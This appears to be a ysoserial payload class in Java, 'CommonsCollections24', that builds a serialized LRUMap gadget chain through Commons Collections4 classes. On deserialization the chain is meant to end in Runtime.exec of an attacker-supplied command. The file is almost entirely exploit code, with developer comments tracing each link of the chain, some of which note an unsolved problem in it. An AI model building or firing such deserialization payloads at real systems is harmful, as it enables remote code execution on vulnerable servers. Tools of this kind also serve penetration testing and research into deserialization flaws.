package ysoserial.payloads;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;

/*
    Cluster2_20220605-162453, second chain.
	Gadget chain:

        chain_LRUMap4-readObject-170f97dab8eb7299a9b59c773ed708856efca487.txt
            [
         <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
         <java.util.EnumMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections24 extends PayloadRunner implements ObjectPayload<LRUMap> {
    enum ProvaEnum {
        zZ,
        yy
    }

    public LRUMap<Object, Object> getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        //Object templates = Gadgets.createTemplatesImpl(command);

        // setup harmless chain
        //final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // DefaultedMap.get() it should be called with an input parameter that is a key not already existing in the map, so that the transformer will be called on that key.
//        DefaultedMap.get();
        // The InvokerTransformer should be set as the LazyMap transformer (via reflection or lazyMap method).
        // The LazyMap.get should be called via EnumMap.equals that casts his parameter into a Map, and calls on that Map getValue and getKey.
//        EnumMap;
        // EnumMap.equals should be called by TiedMapEntry.equals, to do so key and value of the object (Map) passed as parameter of the
        // TiedMapEntry should not be null and the Map object should be different than the TiedMapEntry one.
//        TiedMapEntry;
        // TiedMapEntry.equals should be called by Flat3Map.equals, to do so key and value of the object (Map) passed as parameter of the TiedMapEntry should not be null.
//        Flat3Map;
        // Flat3Map.equals should be called by AbstractHashedMap.isEqualKey, to do so two different objects "key" that results
        //  or not equal in an equals method should be passed as parameters of the isEqualKey method.
//        AbstractHashedMap;
        // AbstractHashedMap.isEqualKey should be called by AbstractHashedMap.put, so the insertion of an object should fire the isEqualKey check.
        //  To do so we should have data not null inside the AbstractHashMap and then the method isEqualKey would be called with as parameter:
        //  the input key of the put parameter and a key from the AbstractHashMap entry analyzed, so the map must contain at least
        //  another entry different from the one we are trying to insert at this moment.
        // AbstractHashedMap.put should be called by AbstractHashedMap.doReadObject, so put is called when the AbstractHashedMap
        //  object is deserialized, and it's content in byte is read and put inside the map.
        // AbstractHashedMap.doReadObject is called by LRUMap.doReadObject via super.doReadObject(input parameter)
        // Lastly LRUMap.doReadObject is called by LRUMap.readObject during the normal deserialization process.
//        LRUMap;

        //Object object = new Object();
        //EnumMap enumMap = new EnumMap(object);

        /* Map<Object, Object> lazyMap = LazyMap.lazyMap(new LRUMap<Object, Object>(), transformer);
        lazyMap.put(templates, templates);
        Object templ = lazyMap.get(templates);*/

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map innerMap3 = new HashMap();

        // Creating two DefaultedMap with colliding hashes, in order to force element comparison during readObject
        Map defaultedMap1 = DefaultedMap.defaultedMap(innerMap1, (Object) transformerChain);
        defaultedMap1.put("yy", 1);

        Map defaultedMap2 = DefaultedMap.defaultedMap(innerMap2, (Object) transformerChain);
        defaultedMap2.put("zZ", 1);

        /* LRUMap<Object, Object> outputLRUMap = new LRUMap<Object, Object>();
        //outputLRUMap.put(templates, templates);
        Flat3Map<String, Integer> flat3map1 = new Flat3Map<String, Integer>();
        flat3map1.put("zZ", 1);
        flat3map1.put("yy", 1);
        outputLRUMap.put(flat3map1, 1); */

        //Object templates2 = Gadgets.createTemplatesImpl(command);
        /*Object templates2 = templates;
        //outputLRUMap.put(templates2, templates2);
        Flat3Map<String, Integer> flat3map2 = new Flat3Map<String, Integer>();
        flat3map2.put("zZ", 1);
        outputLRUMap.put(flat3map2, 2);*/

        //Map lazyMapEnum = LazyMap.decorate(innerMap3, transformerChain);
        //lazyMapEnum.put(ProvaEnum.zZ, 1);
        EnumMap<ProvaEnum, Map<Object,Object>> enumMap1 = new EnumMap(ProvaEnum.class);
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(enumMap1, defaultedMap2); // lazyMapEnum


        Flat3Map flat3map1 = new Flat3Map();
        //flat3map1.put(lazyMap1, 1);
        flat3map1.put(defaultedMap1, tiedMapEntry1);
        //flat3map1.put(flat3map1, 1);

        Flat3Map flat3map2 = new Flat3Map();
        //flat3map2.put(lazyMap2, 1);
        flat3map2.put(defaultedMap2, tiedMapEntry1);
        //flat3map2.put(flat3map2, 2);



        /*EnumMap enumMap2 = new EnumMap(lazyMap1);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, new Object());*/

        // Use the colliding Maps as keys in LRUMap
        LRUMap outputLRUMap = new LRUMap();
        outputLRUMap.put(flat3map1, tiedMapEntry1); // , 1
        outputLRUMap.put(flat3map2, tiedMapEntry1); // , 2
        /*LRUMap outputLRUMap = new LRUMap();
        outputLRUMap.put(tiedMapEntry1, 1);
        outputLRUMap.put(tiedMapEntry2, 2);*/

        // the problem is in:  @Override
        //    public V put(final K key, final V value) {
        //        final Object convertedKey = convertKey(key);
        //        final int hashCode = hash(convertedKey);
        //        final int index = hashIndex(hashCode, data.length);
        //        HashEntry<K, V> entry = data[index];
        //        while (entry != null) {
        //            if (entry.hashCode == hashCode && isEqualKey(convertedKey, entry.key)) {
        //                final V oldValue = entry.getValue();
        //                updateEntry(entry, value);
        //                return oldValue;
        //            }
        //            entry = entry.next;
        //        }
        //
        //        addMapping(index, hashCode, key, value);
        //        return null;
        //    }
        // Because the entry is always null so it doesn't call isEqualKey
        // Think if it's possible to do something similar to the colliding hashes of CommonsCollections7.

        // define the comparator used for sorting
       // TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
      //  TreeBag tree = new TreeBag(comp);
      //  tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        defaultedMap2.remove("yy");

        return outputLRUMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections24.class, args);
    }

}
